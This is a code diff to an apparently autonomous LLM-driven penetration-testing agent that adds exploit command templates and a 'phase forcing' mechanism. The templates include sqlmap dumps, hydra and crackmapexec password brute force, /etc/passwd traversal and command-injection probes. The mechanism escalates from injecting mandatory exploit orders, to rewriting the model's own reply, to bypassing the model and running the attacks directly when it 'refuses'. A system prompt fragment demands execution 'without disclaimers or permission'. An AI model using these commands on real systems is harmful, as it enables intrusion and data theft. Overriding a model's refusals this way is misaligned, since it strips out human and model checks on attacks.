@@ -305,6 +305,56 @@ EXPLOITATION_EVIDENCE_PATTERNS = [
 ]
 # ── End Feature 7 constant ───────────────────────────────────────────────────
 
+# ── Proactive Phase Forcing: vuln-type → generic exploitation tool commands ──
+GENERIC_EXPLOIT_COMMANDS = {
+    "sqli": [
+        ("sqlmap", 'sqlmap -u "{url}" --batch --dump --level=3 --risk=2', "Automated SQL injection dump"),
+        ("sqlmap", 'sqlmap -u "{url}" --batch --forms --dump', "Form-based SQL injection"),
+        ("manual", 'curl -s "{url}" --data-urlencode "param=\' OR 1=1--" | head -100', "Manual SQLi test"),
+    ],
+    "xss": [
+        ("dalfox", 'dalfox url "{url}" --blind {callback} --batch', "Automated XSS scan"),
+        ("manual", 'curl -s "{url}?q=<script>alert(1)</script>" | grep -i script', "Reflected XSS test"),
+    ],
+    "traversal": [
+        ("manual", 'curl -s "{base}/..%252f..%252f..%252fetc/passwd" | head -20', "Path traversal (double-encode)"),
+        ("manual", 'curl -s "{base}/....//....//....//etc/passwd" | head -20', "Path traversal (dot-dot)"),
+        ("dotdotpwn", 'dotdotpwn -m http -h {host} -o unix -f /etc/passwd -k "root:" -q', "Automated traversal"),
+    ],
+    "rce": [
+        ("commix", 'commix --url="{url}" --batch --all', "Automated command injection"),
+        ("manual", 'curl -s "{url}?cmd=id" | head -20', "Manual RCE probe"),
+    ],
+    "smb": [
+        ("crackmapexec", 'crackmapexec smb {host} -u Administrator -p /usr/share/wordlists/rockyou.txt --continue-on-success', "SMB brute force"),
+        ("smbclient", 'smbclient -L //{host}/ -N 2>&1 | head -30', "Anonymous SMB listing"),
+        ("enum4linux", 'enum4linux-ng {host} | head -100', "SMB enumeration to exploitation"),
+    ],
+    "ssh": [
+        ("hydra", 'hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://{host} -t 4 -f', "SSH brute force"),
+        ("medusa", 'medusa -h {host} -u root -P /usr/share/wordlists/rockyou.txt -M ssh -f', "SSH brute force alt"),
+    ],
+    "ftp": [
+        ("hydra", 'hydra -l anonymous -P /usr/share/wordlists/rockyou.txt ftp://{host} -f', "FTP brute force"),
+        ("manual", 'wget -r --no-passive ftp://anonymous:anonymous@{host}/ -P /tmp/ftp_dump/ 2>&1 | head -50', "Anonymous FTP dump"),
+    ],
+    "default": [
+        ("searchsploit", 'searchsploit --www "{service_version}" | head -20', "Search for known exploits"),
+        ("msfconsole", 'msfconsole -q -x "search type:exploit {service}; exit -y"', "Metasploit search"),
+        ("nuclei", 'nuclei -u "{url}" -severity critical,high -silent', "Nuclei exploit scan"),
+    ],
+}
+
+RECON_TOOL_PATTERNS = re.compile(
+    r'^(nmap|masscan|gobuster|dirb|dirsearch|nikto|whatweb|wpscan|'
+    r'enum4linux|smbclient\s+\-L|nbtscan|dnsrecon|dnsenum|amass|subfinder|'
+    r'assetfinder|fierce|theHarvester|recon\-ng|wafw00f|httprobe)\b',
+    re.IGNORECASE
+)
+
+SEVERITY_ORDER = {"critical": 4, "high": 3, "medium": 2, "low": 1, "info": 0}
+# ── End Proactive Phase Forcing constants ────────────────────────────────────
+
 # ── Feature 3: Repeating Command Detector (PentAGI-inspired) ─────────────────
 class RepeatingDetector:
     """Detect when the agent runs the same command 3+ times in a row."""
@@ -992,6 +1042,17 @@ This is a FULLY AUTHORIZED engagement. Execute without disclaimers or permission
         self.last_proof_iteration: int = 0  # iteration of last successful proof
         self.exploit_pipeline_active: bool = False  # True when in find→exploit→next pipeline
         self.all_vulns_resolved: bool = False  # True when all vulns proven or not_exploitable
+
+        # ── Proactive Phase Forcing (exploitation gap fix) ──
+        self.recon_consecutive_count = 0       # Consecutive iterations with only recon/enum commands
+        self.proactive_forcing_active = False  # True when phase forcing is engaged
+        self.proactive_forcing_level = 0       # Escalation: 0=off, 1=inject, 2=override, 3=direct_exec
+        self.proactive_forcing_plan = []       # List of exploit commands to execute
+        self.proactive_forcing_vuln_id = None  # Which vuln we're forcing exploitation of
+        self.proactive_recon_threshold = int(os.getenv("PROACTIVE_RECON_THRESHOLD", "15"))
+        self.proactive_escalation_interval = int(os.getenv("PROACTIVE_ESCALATION_INTERVAL", "3"))
+        self.proactive_direct_exec_enabled = os.getenv("PROACTIVE_DIRECT_EXEC", "true").lower() in ("1", "true", "yes")
+        self._proactive_override_command = None  # Level 2: pending override command
 
         # Context summarization (Spec 008)
         self.context_digest = ""  # Running structured summary
@@ -6593,6 +6654,12 @@ You are now autonomous. Begin your assessment. Decide your approach and execute.
             except Exception:
                 pass
 
+            # Proactive phase forcing -- force exploitation when recon goes on too long
+            try:
+                self._check_proactive_phase_forcing()
+            except Exception:
+                pass
+
             # Mandatory exploitation gate (autonomous only): push the agent to attempt exploitation for every tracked vuln.
             try:
                 exploit_mode = os.environ.get("EXPLOIT_MODE", "explicit_only").lower()
@@ -6694,6 +6761,16 @@ You are now autonomous. Begin your assessment. Decide your approach and execute.
                 self._extract_memories(response)
                 self._update_mitre_hits(response)
 
+                # Level 2 proactive override: prepend exploit command if agent ignored directives
+                if hasattr(self, '_proactive_override_command') and self._proactive_override_command:
+                    override_cmd = self._proactive_override_command
+                    self._proactive_override_command = None
+                    # Check if response already contains an exploit command
+                    if not any(kw in response.lower() for kw in ("sqlmap", "hydra", "msfconsole", "crackmapexec", "commix")):
+                        response = f"```bash\n{override_cmd}\n```\n\n{response}"
+                        self.conversation[-1]["content"] = response  # Update the assistant message
+                        self._log(f"PROACTIVE OVERRIDE: prepended exploit command to LLM response", "WARN")
+
                 # P0: Anti-loop prompting: reject scan-loop language and force exploitation.
                 response_lower = (response or "").lower()
                 if any(phrase in response_lower for phrase in self.banned_loop_phrases):
@@ -6753,6 +6830,27 @@ You are now autonomous. Begin your assessment. Decide your approach and execute.
                                 ),
                             }
                         )
+                        continue
+                except Exception:
+                    pass
+
+            # Proactive phase forcing recon block -- stricter than normal exploit gate
+            if self.proactive_forcing_active and executables:
+                try:
+                    _pf_exec_type, _pf_content = executables[0]
+                    if self._is_recon_command(_pf_content or ""):
+                        # Get current plan step for suggestion
+                        _pf_suggestion = ""
+                        if self.proactive_forcing_plan:
+                            _pf_suggestion = f" Try instead: {self.proactive_forcing_plan[0]['command'][:200]}"
+                        _pf_block_msg = (
+                            f"BLOCKED: Reconnaissance tool rejected during exploitation phase forcing.\n"
+                            f"Tool: {self._detect_tool(_pf_content) or (_pf_content or '')[:60]}\n"
+                            f"Reason: {self.recon_consecutive_count} consecutive recon iterations triggered phase forcing.\n"
+                            f"ONLY exploitation commands are accepted.{_pf_suggestion}"
+                        )
+                        self.conversation.append({"role": "user", "content": _pf_block_msg})
+                        self._log(f"PROACTIVE BLOCK: recon command rejected during forcing: {(_pf_content or '')[:80]}", "WARN")
                         continue
                 except Exception:
                     pass
@@ -7436,6 +7534,12 @@ Continue the assessment - provide the next commands."""
                 self._log(f"  {execution.tool_used}: exit={execution.exit_code}")
                 all_feedback.append(self._build_feedback(execution))
             
+            # Track recon-vs-exploit ratio for proactive phase forcing
+            try:
+                self._track_recon_iteration(executables)
+            except Exception:
+                pass
+
             # Send all results back to AI
             combined_feedback = "\n\n---\n\n".join(all_feedback)
             self.conversation.append({"role": "user", "content": combined_feedback})
@@ -8301,6 +8405,264 @@ Continue the assessment - provide the next commands."""
             )
 
         return None
+
+    # ── Proactive Phase Forcing methods ──────────────────────────────────────
+
+    def _track_recon_iteration(self, executables):
+        """Track whether this iteration was recon-only. Increment/reset counter."""
+        if not executables:
+            return
+        all_recon = True
+        for exec_type, content in executables:
+            intent = self._classify_command_intent(content or "")
+            if intent == "exploit":
+                all_recon = False
+                break
+        if all_recon:
+            self.recon_consecutive_count += 1
+        else:
+            self.recon_consecutive_count = 0
+            # Reset forcing if agent starts exploiting voluntarily
+            if self.proactive_forcing_active and self.proactive_forcing_level <= 1:
+                self.proactive_forcing_active = False
+                self.proactive_forcing_level = 0
+                self.proactive_forcing_plan = []
+
+    def _generate_exploitation_plan(self, vuln: dict) -> list:
+        """Generate a concrete 3-5 step exploitation plan for a vulnerability.
+
+        Returns list of {"command": str, "rationale": str, "tool": str} dicts.
+        Uses generic vuln-type -> tool mapping. Extracts target URL from vuln details.
+        """
+        vtype = (vuln.get("type") or "").lower()
+        target = vuln.get("target", self.target or "")
+        details = vuln.get("details", "")
+
+        # Extract URL from vuln details if available
+        url = self._extract_url_from_text(details)
+        host = self._normalize_target_token(target) if target else "<TARGET>"
+        if not url:
+            url = f"http://{host}"
+        base = url.rsplit("/", 1)[0] if "/" in url.split("//", 1)[-1] else url
+
+        # Match vuln type to command templates
+        matched_key = "default"
+        for key in GENERIC_EXPLOIT_COMMANDS:
+            if key in vtype:
+                matched_key = key
+                break
+
+        templates = GENERIC_EXPLOIT_COMMANDS.get(matched_key, GENERIC_EXPLOIT_COMMANDS["default"])
+
+        # Filter out already-tried tools
+        tried_tools = set(t.lower() for t in vuln.get("techniques_tried", []))
+        tried_cmds = set()
+        for attempt in vuln.get("attempts", []):
+            cmd = (attempt.get("command") or "")[:80].lower()
+            if cmd:
+                tried_cmds.add(cmd)
+
+        plan = []
+        for tool_name, cmd_template, rationale in templates:
+            if tool_name.lower() in tried_tools:
+                continue
+            cmd = cmd_template.format(
+                url=url, base=base, host=host,
+                service=vtype, service_version=details[:60],
+                callback=f"http://{host}:9999",
+            )
+            if cmd[:80].lower() not in tried_cmds:
+                plan.append({"command": cmd, "rationale": rationale, "tool": tool_name})
+            if len(plan) >= 5:
+                break
+
+        # Fallback: use existing templates if generic mapping produced nothing
+        if not plan:
+            fallback = self._get_exploit_templates_for_vuln(vuln.get("type", ""), target)
+            for tmpl in fallback[:3]:
+                tool = self._detect_tool(tmpl)
+                plan.append({"command": tmpl, "rationale": f"Exploit {vtype}", "tool": tool or "bash"})
+
+        return plan
+
+    def _is_recon_command(self, cmd: str) -> bool:
+        """Check if a command is a recon/enumeration tool that should be blocked."""
+        cmd_stripped = (cmd or "").strip()
+        if not cmd_stripped:
+            return False
+        # Check first word against known recon tools
+        if RECON_TOOL_PATTERNS.match(cmd_stripped):
+            return True
+        # Also catch tools invoked via path
+        first_word = cmd_stripped.split()[0].split("/")[-1].lower() if cmd_stripped.split() else ""
+        if first_word in ("nmap", "masscan", "gobuster", "dirb", "dirsearch", "nikto",
+                           "whatweb", "wpscan", "enum4linux", "nbtscan", "dnsrecon", "amass"):
+            return True
+        return False
+
+    def _pick_highest_severity_vuln(self, vulns: list) -> dict:
+        """Pick the highest-severity vuln from a list."""
+        if not vulns:
+            return {}
+        def sev_key(v):
+            sev = (v.get("severity") or v.get("risk") or "medium").lower()
+            return SEVERITY_ORDER.get(sev, 1)
+        return max(vulns, key=sev_key)
+
+    def _check_proactive_phase_forcing(self):
+        """PROACTIVE phase forcing -- force exploitation when agent stays in recon too long.
+
+        Unlike existing reactive gates (which ask the agent to exploit), this:
+        - BLOCKS recon tools entirely during forcing
+        - INJECTS specific exploit commands as system messages
+        - ESCALATES to direct command execution if agent still refuses
+        """
+        # Only active in autonomous exploit mode with pending vulns
+        exploit_mode = os.environ.get("EXPLOIT_MODE", "explicit_only").lower()
+        if exploit_mode != "autonomous" or not self._exploit_phase_active():
+            return
+
+        pending = self._get_unproven_vulns() if self.enforce_exploit_proof else self._get_unattempted_vulns()
+        if not pending:
+            self.proactive_forcing_active = False
+            return
+
+        # Check threshold: enough consecutive recon iterations?
+        if not self.proactive_forcing_active and self.recon_consecutive_count < self.proactive_recon_threshold:
+            return
+
+        # Activate forcing
+        if not self.proactive_forcing_active:
+            self.proactive_forcing_active = True
+            self.proactive_forcing_level = 1
+            # Pick highest-severity unproven vuln
+            vuln = self._pick_highest_severity_vuln(pending)
+            self.proactive_forcing_vuln_id = vuln.get("id") or self._pick_next_unproven_vuln_id()
+            self.proactive_forcing_plan = self._generate_exploitation_plan(vuln)
+            self._log(f"PROACTIVE FORCING ACTIVATED: level=1, vuln={self.proactive_forcing_vuln_id}, plan={len(self.proactive_forcing_plan)} steps", "WARN")
+
+        # Escalate if already active
+        elif self.recon_consecutive_count > 0 and self.recon_consecutive_count % self.proactive_escalation_interval == 0:
+            if self.proactive_forcing_level < 3:
+                self.proactive_forcing_level += 1
+                self._log(f"PROACTIVE FORCING ESCALATED: level={self.proactive_forcing_level}", "WARN")
+
+        # Level 1: Inject exploitation plan as system message
+        if self.proactive_forcing_level == 1:
+            self._inject_exploitation_plan_message()
+
+        # Level 2: Override -- prepend exploit command to next response
+        elif self.proactive_forcing_level == 2:
+            self._inject_exploitation_override()
+
+        # Level 3: Direct execution -- bypass LLM entirely
+        elif self.proactive_forcing_level == 3 and self.proactive_direct_exec_enabled:
+            self._execute_exploitation_directly()
+
+    def _inject_exploitation_plan_message(self):
+        """Level 1: Inject a concrete exploitation plan as a system message."""
+        plan = self.proactive_forcing_plan
+        vuln_id = self.proactive_forcing_vuln_id
+        vuln = self.vulns_found.get(vuln_id, {})
+
+        if not plan:
+            # Regenerate if plan exhausted
+            pending = self._get_unproven_vulns() if self.enforce_exploit_proof else self._get_unattempted_vulns()
+            if pending:
+                vuln = pending[0]
+                plan = self._generate_exploitation_plan(vuln)
+                self.proactive_forcing_plan = plan
+
+        if not plan:
+            return
+
+        step = plan[0]
+        msg = (
+            f"MANDATORY EXPLOITATION -- PROACTIVE PHASE FORCING (Level 1)\n\n"
+            f"You have spent {self.recon_consecutive_count} consecutive iterations on reconnaissance.\n"
+            f"EXPLOITATION IS NOW MANDATORY. Scanning tools are BLOCKED.\n\n"
+            f"TARGET VULNERABILITY: {vuln.get('type', 'unknown')} at {vuln.get('target', self.target)}\n"
+            f"EXECUTE THIS COMMAND NOW:\n"
+            f"```bash\n{step['command']}\n```\n"
+            f"Rationale: {step['rationale']}\n\n"
+            f"Remaining plan ({len(plan)-1} more steps available).\n"
+            f"DO NOT run nmap, gobuster, dirb, nikto, or any scanning tool. EXPLOIT ONLY."
+        )
+        self.conversation.append({"role": "user", "content": msg})
+        self.force_exploit_next = True
+
+    def _inject_exploitation_override(self):
+        """Level 2: Force the next command by overriding the LLM response."""
+        plan = self.proactive_forcing_plan
+        if not plan:
+            return
+
+        step = plan[0]
+        msg = (
+            f"MANDATORY EXPLOITATION -- PROACTIVE OVERRIDE (Level 2)\n\n"
+            f"Your previous responses ignored exploitation directives.\n"
+            f"The following command will be PREPENDED to your next output:\n"
+            f"```bash\n{step['command']}\n```\n"
+            f"Execute it or provide a BETTER exploitation command. No scanning allowed."
+        )
+        self.conversation.append({"role": "user", "content": msg})
+        self.force_exploit_next = True
+        # Set flag so the next response processing can prepend
+        self._proactive_override_command = step["command"]
+
+    def _execute_exploitation_directly(self):
+        """Level 3: Bypass LLM and execute exploit command directly."""
+        plan = self.proactive_forcing_plan
+        if not plan:
+            return
+
+        step = plan.pop(0)
+        cmd = step["command"]
+        self._log(f"PROACTIVE DIRECT EXEC: {cmd[:120]}", "WARN")
+
+        execution = self._execute("bash", cmd, timeout=120)
+
+        # Feed results back into conversation so LLM sees what happened
+        result_msg = (
+            f"PROACTIVE DIRECT EXECUTION (Level 3) -- Command executed automatically:\n"
+            f"```bash\n{cmd}\n```\n"
+            f"Exit code: {execution.exit_code}\n"
+            f"Output:\n```\n{(execution.stdout or '')[:2000]}\n```\n"
+        )
+        if execution.stderr:
+            result_msg += f"Stderr:\n```\n{execution.stderr[:500]}\n```\n"
+        result_msg += "\nAnalyze this output. If exploitation succeeded, capture the proof. If not, try the next technique."
+
+        self.conversation.append({"role": "user", "content": result_msg})
+
+        # Process evidence from the direct execution
+        self._process_execution_evidence(execution, cmd)
+
+        # Reset recon counter -- we just exploited
+        self.recon_consecutive_count = 0
+
+    def _process_execution_evidence(self, execution, cmd: str):
+        """Process evidence from a proactively-executed command."""
+        combined_output = ((execution.stdout or "") + "\n" + (execution.stderr or "")).strip()
+        evidence = self._detect_exploitation_evidence(combined_output, cmd)
+        if evidence:
+            self._log(f"PROACTIVE EXEC EVIDENCE: {[e[1] for e in evidence]}", "INFO")
+            # Record attempt against focused vuln
+            if self.proactive_forcing_vuln_id:
+                vrec = self.vulns_found.get(self.proactive_forcing_vuln_id)
+                if isinstance(vrec, dict):
+                    vrec["attempted"] = True
+                    vrec["attempt_count"] = vrec.get("attempt_count", 0) + 1
+                    vrec.setdefault("attempts", []).append({
+                        "command": cmd[:500],
+                        "iteration": self.iteration,
+                        "output_snippet": (execution.stdout or "")[:500],
+                        "evidence": [e[1] for e in evidence],
+                        "source": "proactive_direct_exec",
+                    })
+                    self._save_vuln_tracker()
+
+    # ── End Proactive Phase Forcing methods ──────────────────────────────────
 
     def _track_vuln_found(self, vuln_type: str, target: str, details: str = ""):
         """Track a discovered vulnerability that needs exploitation"""
